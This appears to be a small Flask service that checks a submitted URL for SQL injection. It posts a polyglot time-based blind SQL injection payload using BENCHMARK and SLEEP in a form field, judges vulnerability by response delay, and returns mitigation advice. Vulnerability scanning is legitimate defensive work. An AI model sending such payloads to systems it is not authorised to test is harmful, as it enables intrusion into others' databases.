from flask import Flask, request,jsonify
import requests
import sys
import urllib3
import time



app = Flask(__name__)

@app.route('/urlchecking', methods = ['POST'])
def index():
     req = request.get_json()
     targetURL = req['url']

     response = requests.get(targetURL)
     response.status_code
     if response.status_code == 200:
        # return jsonify({'message':'success!'})
        url_status= 'the url exists'
        data = {'userEmail':"usman@cyberpersons.com",'status':'1','password':"cyberpersons'",'findUs':'IF(SUBSTR(@@version,1,1)&lt;5,BENCHMARK(2000000,SHA1(0xDE7EC71F1)),SLEEP(1))/*\'XOR(IF(SUBSTR(@@version,1,1)&lt;5,BENCHMARK(2000000,SHA1(0xDE7EC71F1)),SLEEP(1)))OR\'|"XOR(IF(SUBSTR(@@version,1,1)&lt;5,BENCHMARK(2000000,SHA1(0xDE7EC71F1)),SLEEP(1)))OR"*/'}
            
        response = requests.post(targetURL,data)
        
        #  print (response.elapsed.total_seconds())
        scantime = response.elapsed.total_seconds()
        if scantime < 1:
            message='Application is not vulnerable to sql injection'
            return jsonify({'message':message, 'url_Status':url_status})
        else:
            sms1 = 'Application is vulnerable to sql injection'
            sms2 = 'To mitigate an sql vulnerability involve:'
            sms3 = '1. Make sure all inputs from user are validated and ensure Server side sanitization'
            sms4 = '2. Ensure the use of stored procedures and parameterization.'
            message = sms1 + sms2 +sms3 + sms4 
            return jsonify({'message':message, 'url_status':url_status})
     
     elif response.status_code == 404:
        return jsonify({'url_status':'Not Found. Please enter the valid url'})
 
if __name__ == '__main__':
    app.run(debug=True, port='3444')